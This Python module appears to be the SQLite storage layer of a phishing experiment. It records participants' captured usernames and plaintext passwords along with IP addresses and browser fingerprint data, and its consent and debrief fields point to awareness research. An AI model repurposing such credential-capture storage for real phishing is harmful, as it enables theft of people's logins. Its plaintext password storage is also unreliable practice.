import json
import sqlite3
import secrets
from datetime import datetime
from .config import CONFIG


def init_database():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            participant_id TEXT NOT NULL,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            consent_given BOOLEAN DEFAULT 0,
            debriefed BOOLEAN DEFAULT 0,
            session_token TEXT,
            notes TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            browser_language TEXT,
            platform TEXT,
            time_on_page INTEGER,
            referrer TEXT,
            click_count INTEGER,
            step TEXT
        )
    ''')

    for col in ['screen_resolution', 'timezone', 'browser_language', 'platform',
                'time_on_page', 'referrer', 'click_count', 'step', 'country']:
        try:
            c.execute(f"ALTER TABLE captured_credentials ADD COLUMN {col} TEXT")
        except:
            pass

    c.execute('''
        CREATE TABLE IF NOT EXISTS experiment_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT NOT NULL,
            participant_id TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS access_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            endpoint TEXT,
            method TEXT,
            status INTEGER,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS ip_blacklist (
            ip TEXT PRIMARY KEY,
            reason TEXT,
            attempts INTEGER DEFAULT 1,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS votes_top3 (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            participant_id TEXT NOT NULL,
            pseudo TEXT,
            votes_data TEXT,
            snap_validated INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            validated_at DATETIME
        )
    ''')
    conn.commit()
    conn.close()


def generate_participant_id():
    return f"P{datetime.now().strftime('%Y%m%d')}-{secrets.token_hex(4).upper()}"


def log_event(event_type, participant_id=None, details=None):
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "INSERT INTO experiment_log (event_type, participant_id, details) VALUES (?, ?, ?)",
        (event_type, participant_id, json.dumps(details) if details else None)
    )
    conn.commit()
    conn.close()


def log_access(ip, endpoint, method, status):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        c.execute("INSERT INTO access_log (ip, endpoint, method, status) VALUES (?, ?, ?, ?)",
                  (ip, endpoint, method, status))
        conn.commit()
        conn.close()
    except:
        pass


def is_blacklisted(ip):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        row = c.execute("SELECT attempts FROM ip_blacklist WHERE ip = ?", (ip,)).fetchone()
        conn.close()
        return row and row[0] >= 5
    except:
        return False


def blacklist_ip(ip, reason):
    try:
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        c.execute("""
            INSERT INTO ip_blacklist (ip, reason, attempts) VALUES (?, ?, 1)
            ON CONFLICT(ip) DO UPDATE SET attempts = attempts + 1, reason = ?
        """, (ip, reason, reason))
        conn.commit()
        conn.close()
    except:
        pass
